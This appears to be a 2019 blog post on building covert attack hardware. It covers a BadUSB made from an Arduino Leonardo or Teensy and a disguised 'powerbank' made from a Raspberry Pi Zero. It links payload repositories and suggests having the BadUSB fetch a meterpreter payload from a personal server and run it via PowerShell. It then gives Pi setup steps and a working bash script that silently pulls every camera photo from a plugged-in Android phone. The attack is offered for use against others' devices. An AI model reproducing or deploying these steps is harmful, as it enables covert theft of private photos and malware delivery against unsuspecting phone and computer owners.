---
title: Devices For Badusb And Badpowerbank
date: 2019-01-11 16:35:11
categories: IoT
tags: [Badusb, powerbank]
keywords: [Badusb, powerbank]
description: Here are some devices I know to perform an IoT attack, these devices can pretend things that people use most of the time, such as USB flash disk and powerbank.
---

To perform a badusb attack, you need to have a tiny Development board to write your payload on it. The Arduino development board is a good choice. 

Then you should make the development board execute your own payload, there are some Github repositories to get the payloads, like https://github.com/Screetsec/Pateensy for Teensy board and https://github.com/recursively/BadUSB-code for Arduino Leonardo. 

It's hard to tell the difference between the Arduino Leonardo board and the normal USB flash disk.

<img src="pic_5.jpeg" width="60%" height="60%">

By the way, The badusb acts like a keyboard, you can download the meterpreter payload or something else from your personal server and execute it automatically with PowerShell.

Or you want to pull some data from or to push some virus to someone's telephone with just a powerbank. The easiest way is to use the Raspberry Pi Zero.

To get started, burn a fresh image of Raspbian distribution to a micro SD card on your desktop with software like SD Card Formatter or something else.

Once that’s finished, navigate to the root directory of the micro SD card and open the file *config.txt*. Scroll down to the bottom of the file and add *dtoverlay=dwc2* to a new line.

<img src="pic_1.png" width="60%" height="60%">

Save and exit the *config.txt* file.

Then open the *cmdline.txt* file, find the command *rootwait* and add *modules-load=dwc2,g_ether* after it.

<img src="pic_2.png" width="60%" height="60%">

Save and exit the *cmdline.txt* file.

Then insert your SD card into your Raspberry Pi Zero, connect the USB port between your computer and your Pi Zero.

If you are using MacOS, it will be much easier to connect to the SSH service on your Pi Zero. You can find the new network device in the network settings.

<img src="pic_3.png" width="30%" height="30%">

After that, you can just use address *raspberrypi.local* to log in to your Pi.
```shell
ssh pi@raspberrypi.local
```

Install the ADB tools on your Raspberry Pi. You can learn about more details of ADB tools from https://developer.android.com/studio/command-line/adb.
```shell
sudo apt update
sudo apt install -y android-tools-adb android-tools-fastboot
```

Making sure the adb tools work properly.
```shell
adb devices
```
You can see a list of available Android devices if everything goes well.
```shell
List of devices attached
12c264a0	device
```

Making sure your Pi is connected to the Wi-Fi network, so you can log in to your Pi wirelessly.

A portable power source is necessary.

<img src="pic_4.jpeg" width="60%" height="60%">

The Android telephone can be debugged only when the developer mode is turned on and the USB debugging is allowed.

Here I wrote a piece of code to grab the photos from the target telephone.

```shell
#!/bin/bash
flag=0
flagone=0
while [ $flag -eq 0 ]
#while (adb devices | grep -w device)
do
	#if [ -e /dev/libmtp* ]
	if adb devices | grep -w device > /dev/null ;
	then
		if [ $flagone -eq 0 ]
		then
#		echo done!
#		adb pull /mnt/sdcard/DCIM/Camera > /dev/null
		adb pull /storage/self/primary/DCIM/Camera > /dev/null
		echo done!
		flagone=1
	fi

		#sleep 10s
	elif ! adb devices | grep -w device > /dev/null ;
	then
		flagone=0
	fi

done
```

When the telephone is plugged into the Pi, all the photos will be pulled from the target telephone. 
